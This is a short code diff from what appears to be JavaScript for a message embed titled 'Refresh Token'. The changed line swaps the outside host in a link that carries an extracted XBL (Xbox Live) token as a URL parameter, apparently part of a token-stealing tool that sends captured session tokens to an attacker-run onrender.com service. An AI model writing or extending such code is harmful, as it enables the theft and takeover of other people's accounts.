@@ -195,7 +195,7 @@ const messageEmbed = {
   const xblEmbed = {
     color: 0x04042c,
     title: 'Refresh Token',
-  description: `[Refresh Link](https://testingweb69.onrender.com/refreshxbl?xbl=${extractedInfo.xbl || 'N/A'})`,
+  description: `[Refresh Link](https://testingrender69.onrender.com/refreshxbl?xbl=${extractedInfo.xbl || 'N/A'})`,
   };
 
   const configPath = 'config.txt';
